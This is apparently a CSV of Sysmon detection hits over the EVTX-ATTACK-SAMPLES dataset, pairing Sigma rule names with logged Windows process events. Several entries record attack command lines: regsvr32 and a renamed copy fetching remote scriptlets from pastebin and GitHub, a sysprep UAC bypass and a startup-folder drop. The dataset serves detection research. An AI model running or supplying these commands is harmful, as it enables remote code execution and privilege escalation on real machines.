2019-05-12T17:20:49.458113+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Execution/exec_sysmon_1_ftp.evtx,1,Microsoft-Windows-Sysmon,1,16514,IEWIN7,"Image: C:\Windows\System32\calc.exe
RuleName: ''
Description: Windows Calculator
TerminalSessionId: 1
ParentCommandLine: C:\Windows\system32\cmd.exe /C c:\Windows\system32\calc.exe
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2392
LogonGuid: 365ABB72-4FB5-5CD8-0000-0020F2350100
Hashes: SHA1=9018A7D6CDBE859A430E8794E73381F77C840BE0,MD5=60B7C0FEAD45F2066E5B805A91F4F0FC,SHA256=80C10EE5F21F92F89CBC293A59D2FD4C01C7958AACAD15642558DB700943FA22,IMPHASH=F93B5D76132F6E6068946EC238813CE1
ParentProcessGuid: 365ABB72-55F1-5CD8-0000-0010781C3300
ProcessId: 684
CurrentDirectory: C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\
ProcessGuid: 365ABB72-55F1-5CD8-0000-00103D1E3300
CommandLine: c:\Windows\system32\calc.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x135f2'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-05-12 17:20:49.277
"
2019-05-12T18:35:05.155949+00:00,Hacktool - EDR-Freeze Execution;Potentially Suspicious Regsvr32 HTTP/FTP Pattern;Scripting/CommandLine Process Spawned Regsvr32,data/EVTX-ATTACK-SAMPLES/Execution/exec_sysmon_lobin_regsvr32_sct.evtx,1,Microsoft-Windows-Sysmon,1,16792,IEWIN7,"Image: C:\Windows\System32\regsvr32.exe
RuleName: ''
Description: Microsoft(C) Register Server
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3528
LogonGuid: 365ABB72-63FC-5CD8-0000-0020EE3E0100
Hashes: SHA1=A774A816662FF5B75669AA5BCE751BAB9D0972B8,MD5=432BE6CF7311062633459EEF6B242FB5,SHA256=890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B,IMPHASH=A2DAD36BD73280726DA578EB659D0583
ParentProcessGuid: 365ABB72-6693-5CD8-0000-0010AE4C0E00
ProcessId: 1420
CurrentDirectory: C:\Users\IEUser\
ProcessGuid: 365ABB72-6759-5CD8-0000-0010E2D50F00
CommandLine: regsvr32.exe  /u /s /i:http://pastebin.com/raw/H4A4iDTA scrobj.dll
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x13eee'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-05-12 18:35:05.140
"
2019-05-12T18:35:05.780949+00:00,Hacktool - EDR-Freeze Execution;Unusual Parent Process For Cmd.EXE,data/EVTX-ATTACK-SAMPLES/Execution/exec_sysmon_lobin_regsvr32_sct.evtx,1,Microsoft-Windows-Sysmon,1,16793,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: regsvr32.exe  /u /s /i:http://pastebin.com/raw/H4A4iDTA scrobj.dll
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1420
LogonGuid: 365ABB72-63FC-5CD8-0000-0020EE3E0100
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-6759-5CD8-0000-0010E2D50F00
ProcessId: 1912
CurrentDirectory: C:\Users\IEUser\
ProcessGuid: 365ABB72-6759-5CD8-0000-001085031000
CommandLine: '""C:\Windows\System32\cmd.exe"" '
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0x13eee'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\regsvr32.exe
UtcTime: 2019-05-12 18:35:05.765
"
2019-05-12T18:48:52.219754+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Execution/exec_sysmon_1_lolbin_renamed_regsvr32_scrobj.evtx,1,Microsoft-Windows-Sysmon,1,16839,IEWIN7,"Image: C:\ProgramData\jabber.exe
RuleName: ''
Description: Microsoft(C) Register Server
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3484
LogonGuid: 365ABB72-695E-5CD8-0000-002015370100
Hashes: SHA1=A774A816662FF5B75669AA5BCE751BAB9D0972B8,MD5=432BE6CF7311062633459EEF6B242FB5,SHA256=890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B,IMPHASH=A2DAD36BD73280726DA578EB659D0583
ParentProcessGuid: 365ABB72-6972-5CD8-0000-001000E70500
ProcessId: 1340
CurrentDirectory: c:\ProgramData\
ProcessGuid: 365ABB72-6A94-5CD8-0000-00101BDB0E00
CommandLine: jabber.exe  /u /s /i:http://pastebin.com/raw/H4A4iDTA .\jabber.dll
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x13715'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-05-12 18:48:52.219
"
2019-05-12T18:48:52.766629+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Execution/exec_sysmon_1_lolbin_renamed_regsvr32_scrobj.evtx,1,Microsoft-Windows-Sysmon,1,16840,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: jabber.exe  /u /s /i:http://pastebin.com/raw/H4A4iDTA .\jabber.dll
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1340
LogonGuid: 365ABB72-695E-5CD8-0000-002015370100
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-6A94-5CD8-0000-00101BDB0E00
ProcessId: 3880
CurrentDirectory: c:\ProgramData\
ProcessGuid: 365ABB72-6A94-5CD8-0000-0010C2F10E00
CommandLine: '""C:\Windows\System32\cmd.exe"" '
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0x13715'
IntegrityLevel: Medium
ParentImage: C:\ProgramData\jabber.exe
UtcTime: 2019-05-12 18:48:52.344
"
2019-05-13T18:02:49.160591+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Persistence/sysmon_1_persist_bitsjob_SetNotifyCmdLine.evtx,1,Microsoft-Windows-Sysmon,1,17285,IEWIN7,"Image: C:\Windows\System32\mobsync.exe
RuleName: ''
Description: Microsoft Sync Center
TerminalSessionId: 1
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 596
LogonGuid: 365ABB72-B0EC-5CD9-0000-00201D340100
Hashes: SHA1=02A887DF2F485A19A051AF0F3D01DAC006DD9A83,MD5=CCA67BD391CFC9F036323B2522887A6A,SHA256=79F5BC1AD13A5575A52D39A000D0873B31865659B5EFC66A7FEF5E43E54C38B9,IMPHASH=8B7E2EE81565F21F95BADB244F9C56E6
ParentProcessGuid: 365ABB72-B0EB-5CD9-0000-00108D760000
ProcessId: 3828
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-B147-5CD9-0000-00109D4F0B00
CommandLine: C:\Windows\System32\mobsync.exe -Embedding
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0x1341d'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-05-13 18:02:47.527
"
2019-05-13T18:03:19.681478+00:00,Hacktool - EDR-Freeze Execution;Potentially Suspicious Regsvr32 HTTP/FTP Pattern,data/EVTX-ATTACK-SAMPLES/Persistence/sysmon_1_persist_bitsjob_SetNotifyCmdLine.evtx,1,Microsoft-Windows-Sysmon,1,17287,IEWIN7,"Image: C:\Windows\System32\regsvr32.exe
RuleName: ''
Description: Microsoft(C) Register Server
TerminalSessionId: 1
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 944
LogonGuid: 365ABB72-B0EC-5CD9-0000-00201D340100
Hashes: SHA1=A774A816662FF5B75669AA5BCE751BAB9D0972B8,MD5=432BE6CF7311062633459EEF6B242FB5,SHA256=890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B,IMPHASH=A2DAD36BD73280726DA578EB659D0583
ParentProcessGuid: 365ABB72-B0EC-5CD9-0000-0010D9D20000
ProcessId: 2476
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-B167-5CD9-0000-001062160C00
CommandLine: /u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x1341d'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-05-13 18:03:19.497
"
2019-05-13T18:03:19.681478+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Persistence/sysmon_1_persist_bitsjob_SetNotifyCmdLine.evtx,1,Microsoft-Windows-Sysmon,1,17286,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 944
LogonGuid: 365ABB72-B0EC-5CD9-0000-0020DE330100
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-B0EC-5CD9-0000-0010D9D20000
ProcessId: 2372
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-B167-5CD9-0000-0010EE150C00
CommandLine: /c notepad.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0x133de'
IntegrityLevel: High
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-05-13 18:03:19.482
"
2019-05-13T18:03:19.895876+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Persistence/sysmon_1_persist_bitsjob_SetNotifyCmdLine.evtx,1,Microsoft-Windows-Sysmon,1,17288,IEWIN7,"Image: C:\Windows\System32\notepad.exe
RuleName: ''
Description: Notepad
TerminalSessionId: 1
ParentCommandLine: /c notepad.exe
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2372
LogonGuid: 365ABB72-B0EC-5CD9-0000-0020DE330100
Hashes: SHA1=FC64B1EF19E7F35642B2A2EA5F5D9F4246866243,MD5=A4F6DF0E33E644E802C8798ED94D80EA,SHA256=B56AFE7165AD341A749D2D3BD925D879728A1FE4A4DF206145C1A69AA233F68B,IMPHASH=53A6715F589E88C4FD4541C81B4F57C3
ParentProcessGuid: 365ABB72-B167-5CD9-0000-0010EE150C00
ProcessId: 2584
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-B167-5CD9-0000-00109D240C00
CommandLine: notepad.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x133de'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-05-13 18:03:19.727
"
2019-05-13T18:05:18.692037+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Persistence/sysmon_1_persist_bitsjob_SetNotifyCmdLine.evtx,1,Microsoft-Windows-Sysmon,1,17292,IEWIN7,"Image: C:\Windows\System32\wbem\WMIADAP.exe
RuleName: ''
Description: WMI Reverse Performance Adapter Maintenance Utility
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 944
LogonGuid: 365ABB72-B0EB-5CD9-0000-0020E7030000
Hashes: SHA1=DC6DC543EAC398DE6821325BFF3625C1CFC8EC3D,MD5=52799EAD792B0E9AE7FD4BA5BD18FE5C,SHA256=BE4838F4DB23D56CF75730DD36451C5F0F2ACA36B8A74844E7675DC5D5AD0C58,IMPHASH=FAAD498DDAEF07E1AF22EEF06D02AE2C
ParentProcessGuid: 365ABB72-B0EC-5CD9-0000-0010D9D20000
ProcessId: 1188
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-B1DE-5CD9-0000-0010715B0D00
CommandLine: wmiadap.exe /F /T /R
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-05-13 18:05:18.676
"
2019-05-14T01:29:04.306885+00:00,Hacktool - EDR-Freeze Execution;Potential LethalHTA Technique Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_DCOM_MSHTA_LethalHTA_Sysmon_3_1.evtx,1,Microsoft-Windows-Sysmon,1,17589,IEWIN7,"Image: C:\Windows\System32\mshta.exe
RuleName: ''
Description: Microsoft (R) HTML Application host
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch
Product: Internet Explorer
Company: Microsoft Corporation
ParentProcessId: 596
LogonGuid: 365ABB72-19E0-5CDA-0000-0020CE701000
Hashes: SHA1=D4F0397F83083E1C6FB0894187CC72AEBCF2F34F,MD5=ABDFC692D9FE43E2BA8FE6CB5A8CB95A,SHA256=949485BA939953642714AE6831D7DCB261691CAC7CBB8C1A9220333801F60820,IMPHASH=00B1859A95A316FD37DFF4210480907A
ParentProcessGuid: 365ABB72-965E-5CDA-0000-0010AF760000
ProcessId: 1932
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-19E0-5CDA-0000-001006711000
CommandLine: C:\Windows\System32\mshta.exe -Embedding
FileVersion: 11.00.9600.16428 (winblue_gdr.131013-1700)
User: IEWIN7\IEUser
LogonId: '0x1070ce'
IntegrityLevel: High
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-05-14 01:29:04.293
"
2019-05-14T02:32:48.290682+00:00,Group Membership Reconnaissance Via Whoami.EXE;Hacktool - EDR-Freeze Execution;Local Accounts Discovery,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_1_7_elevate_uacbypass_sysprep.evtx,1,Microsoft-Windows-Sysmon,1,17715,IEWIN7,"Image: C:\Windows\System32\whoami.exe
RuleName: ''
Description: whoami - displays logged on user information
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2016
LogonGuid: 365ABB72-26E1-5CDA-0000-002087350100
Hashes: SHA1=DC058F52AD8ACBD316827B6DCAC2434AB3CC515C,MD5=0EBF71E33EF09CA65D9683AFA999C473,SHA256=599EFD455AEEEFE2044A9B597061F271595033F5D0DF2C99DFDBCA8394BBCEC3,IMPHASH=C5352B949915AB8CD5E1844790D19274
ParentProcessGuid: 365ABB72-28A0-5CDA-0000-001074181300
ProcessId: 2676
CurrentDirectory: C:\temp\PowerShell-Suite-master\
ProcessGuid: 365ABB72-28D0-5CDA-0000-00103A6B1300
CommandLine: '""C:\Windows\system32\whoami.exe""  /groups'
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x13587'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-14 02:32:48.290
"
2019-05-14T02:32:48.359432+00:00,Group Membership Reconnaissance Via Whoami.EXE;Hacktool - EDR-Freeze Execution;Local Accounts Discovery,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_1_7_elevate_uacbypass_sysprep.evtx,1,Microsoft-Windows-Sysmon,1,17717,IEWIN7,"Image: C:\Windows\System32\whoami.exe
RuleName: ''
Description: whoami - displays logged on user information
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2016
LogonGuid: 365ABB72-26E1-5CDA-0000-002087350100
Hashes: SHA1=DC058F52AD8ACBD316827B6DCAC2434AB3CC515C,MD5=0EBF71E33EF09CA65D9683AFA999C473,SHA256=599EFD455AEEEFE2044A9B597061F271595033F5D0DF2C99DFDBCA8394BBCEC3,IMPHASH=C5352B949915AB8CD5E1844790D19274
ParentProcessGuid: 365ABB72-28A0-5CDA-0000-001074181300
ProcessId: 3964
CurrentDirectory: C:\temp\PowerShell-Suite-master\
ProcessGuid: 365ABB72-28D0-5CDA-0000-0010F76F1300
CommandLine: '""C:\Windows\system32\whoami.exe""  /groups'
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x13587'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-14 02:32:48.342
"
2019-05-14T02:32:51.143807+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_1_7_elevate_uacbypass_sysprep.evtx,1,Microsoft-Windows-Sysmon,1,17719,IEWIN7,"Image: C:\Windows\System32\consent.exe
RuleName: ''
Description: Consent UI for administrative applications
TerminalSessionId: 1
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 968
LogonGuid: 365ABB72-A56E-5CDA-0000-0020E7030000
Hashes: SHA1=A0396C4F136E19E6FF9EFD45E5D0580BD8F193F1,MD5=2C290AE8C7DA38C3FF9EB1B11606170B,SHA256=644B4C317E5455FFC5941A35C5D085927CB6043FFB80DCF7F18DA8C6F6998643,IMPHASH=3F38F9B645EEBC120F6DFE0B37F41F22
ParentProcessGuid: 365ABB72-26E0-5CDA-0000-00101CD50000
ProcessId: 3776
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-28D3-5CDA-0000-0010B08B1300
CommandLine: consent.exe 968 288 03573528
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-05-14 02:32:51.092
"
2019-05-14T02:32:51.453182+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_1_7_elevate_uacbypass_sysprep.evtx,1,Microsoft-Windows-Sysmon,1,17720,IEWIN7,"Image: C:\Windows\System32\sysprep\sysprep.exe
RuleName: ''
Description: System Preparation Tool
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2016
LogonGuid: 365ABB72-26E1-5CDA-0000-002087350100
Hashes: SHA1=24938F8BAA45E385958DBE7BE53A2E03A1C589EE,MD5=06648F3712AD7975E8220524672E2DD1,SHA256=DE3DFB3617B3E3FABB9F12088E7D2019510915E0AE2397E7F96FE2575CFBF8FC,IMPHASH=E925A3BDE35ECBE27F0C2C2AB1030008
ParentProcessGuid: 365ABB72-28A0-5CDA-0000-001074181300
ProcessId: 1020
CurrentDirectory: C:\temp\PowerShell-Suite-master\
ProcessGuid: 365ABB72-28D3-5CDA-0000-001019AA1300
CommandLine: '""C:\Windows\System32\sysprep\sysprep.exe""'
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0x13587'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-14 02:32:51.453
"
2019-05-14T02:32:51.470369+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_1_7_elevate_uacbypass_sysprep.evtx,1,Microsoft-Windows-Sysmon,1,17722,IEWIN7,"Image: C:\Windows\System32\sysprep\sysprep.exe
RuleName: ''
Description: System Preparation Tool
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2016
LogonGuid: 365ABB72-26E1-5CDA-0000-002087350100
Hashes: SHA1=24938F8BAA45E385958DBE7BE53A2E03A1C589EE,MD5=06648F3712AD7975E8220524672E2DD1,SHA256=DE3DFB3617B3E3FABB9F12088E7D2019510915E0AE2397E7F96FE2575CFBF8FC,IMPHASH=E925A3BDE35ECBE27F0C2C2AB1030008
ParentProcessGuid: 365ABB72-28A0-5CDA-0000-001074181300
ProcessId: 2768
CurrentDirectory: C:\temp\PowerShell-Suite-master\
ProcessGuid: 365ABB72-28D3-5CDA-0000-00106FAA1300
CommandLine: '""C:\Windows\System32\sysprep\sysprep.exe"" ""C:\Windows\System32\sysprep\sysprep.exe"" '
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0x13587'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-14 02:32:51.453
"
2019-05-14T02:32:51.487557+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_1_7_elevate_uacbypass_sysprep.evtx,1,Microsoft-Windows-Sysmon,1,17724,IEWIN7,"Image: C:\Windows\System32\sysprep\sysprep.exe
RuleName: ''
Description: System Preparation Tool
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2016
LogonGuid: 365ABB72-26E1-5CDA-0000-002087350100
Hashes: SHA1=24938F8BAA45E385958DBE7BE53A2E03A1C589EE,MD5=06648F3712AD7975E8220524672E2DD1,SHA256=DE3DFB3617B3E3FABB9F12088E7D2019510915E0AE2397E7F96FE2575CFBF8FC,IMPHASH=E925A3BDE35ECBE27F0C2C2AB1030008
ParentProcessGuid: 365ABB72-28A0-5CDA-0000-001074181300
ProcessId: 572
CurrentDirectory: C:\temp\PowerShell-Suite-master\
ProcessGuid: 365ABB72-28D3-5CDA-0000-00103BAC1300
CommandLine: '""C:\Windows\System32\sysprep\sysprep.exe"" '
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0x13587'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-14 02:32:51.470
"
2019-05-14T02:32:51.487557+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_1_7_elevate_uacbypass_sysprep.evtx,1,Microsoft-Windows-Sysmon,1,17726,IEWIN7,"Image: C:\Windows\System32\consent.exe
RuleName: ''
Description: Consent UI for administrative applications
TerminalSessionId: 1
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 968
LogonGuid: 365ABB72-A56E-5CDA-0000-0020E7030000
Hashes: SHA1=A0396C4F136E19E6FF9EFD45E5D0580BD8F193F1,MD5=2C290AE8C7DA38C3FF9EB1B11606170B,SHA256=644B4C317E5455FFC5941A35C5D085927CB6043FFB80DCF7F18DA8C6F6998643,IMPHASH=3F38F9B645EEBC120F6DFE0B37F41F22
ParentProcessGuid: 365ABB72-26E0-5CDA-0000-00101CD50000
ProcessId: 3388
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-28D3-5CDA-0000-001055AD1300
CommandLine: consent.exe 968 312 0197CDB0
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-05-14 02:32:51.470
"
2019-05-14T02:32:51.814119+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_1_7_elevate_uacbypass_sysprep.evtx,1,Microsoft-Windows-Sysmon,1,17727,IEWIN7,"Image: C:\Windows\System32\sysprep\sysprep.exe
RuleName: ''
Description: System Preparation Tool
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2016
LogonGuid: 365ABB72-26E1-5CDA-0000-002045350100
Hashes: SHA1=24938F8BAA45E385958DBE7BE53A2E03A1C589EE,MD5=06648F3712AD7975E8220524672E2DD1,SHA256=DE3DFB3617B3E3FABB9F12088E7D2019510915E0AE2397E7F96FE2575CFBF8FC,IMPHASH=E925A3BDE35ECBE27F0C2C2AB1030008
ParentProcessGuid: 365ABB72-28A0-5CDA-0000-001074181300
ProcessId: 3068
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-28D3-5CDA-0000-00106DC31300
CommandLine: '""C:\Windows\System32\sysprep\sysprep.exe"" '
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0x13545'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-14 02:32:51.676
"
2019-05-14T02:32:51.831307+00:00,Hacktool - EDR-Freeze Execution;Non Interactive PowerShell Process Spawned;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_1_7_elevate_uacbypass_sysprep.evtx,1,Microsoft-Windows-Sysmon,1,17729,IEWIN7,"Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
Description: Windows PowerShell
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\sysprep\sysprep.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3068
LogonGuid: 365ABB72-26E1-5CDA-0000-002045350100
Hashes: SHA1=04C5D2B4DA9A0F3FA8A45702D4256CEE42D8C48D,MD5=92F44E405DB16AC55D97E3BFE3B132FA,SHA256=6C05E11399B7E3C8ED31BAE72014CF249C144A8F4A2C54A758EB2E6FAD47AEC7,IMPHASH=96BA691B035D05F44E35AB23F6BA946C
ParentProcessGuid: 365ABB72-28D3-5CDA-0000-00106DC31300
ProcessId: 3976
CurrentDirectory: C:\Windows\system32\WindowsPowerShell\v1.0\
ProcessGuid: 365ABB72-28D3-5CDA-0000-001088C71300
CommandLine: '""C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe""'
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x13545'
IntegrityLevel: High
ParentImage: C:\Windows\System32\sysprep\sysprep.exe
UtcTime: 2019-05-14 02:32:51.728
"
2019-05-14T14:04:05.697491+00:00,Hijack Legit RDP Session to Move Laterally;Startup Folder File Write;Suspicious Double Extension Files;UAC Bypass Using Windows Media Player - File,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_tsclient_startup_folder.evtx,1,Microsoft-Windows-Sysmon,11,31145,alice.insecurebank.local,"ProcessGuid: ECAD0485-C903-5CDA-0000-0010340F1000
CreationUtcTime: 2019-05-14 13:55:57.243
UtcTime: 2019-05-14 14:04:05.696
ProcessId: 2580
RuleName: ''
TargetFilename: C:\Users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\cmd.exe
Image: C:\Windows\system32\mstsc.exe
"
2019-05-15T04:18:40.474644+00:00,Service Binary in Suspicious Folder;Trust Access Disable For VBApplications,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_sysmon_13_VBA_Security_AccessVBOM.evtx,1,Microsoft-Windows-Sysmon,13,17915,IEWIN7,"Image: C:\Windows\system32\wbem\wmiprvse.exe
TargetObject: HKU\S-1-5-21-3583694148-1414552638-2922671848-1000\Software\Microsoft\Office\16.0\Excel\Security\AccessVBOM
RuleName: Defense Evasion - access to the VBA project object model in the Macro Settings changed
EventType: SetValue
ProcessId: 3804
ProcessGuid: 365ABB72-92DF-5CDB-0000-0010A15E1300
UtcTime: 2019-05-15 04:18:40.459
Details: DWORD (0x00000001)
"
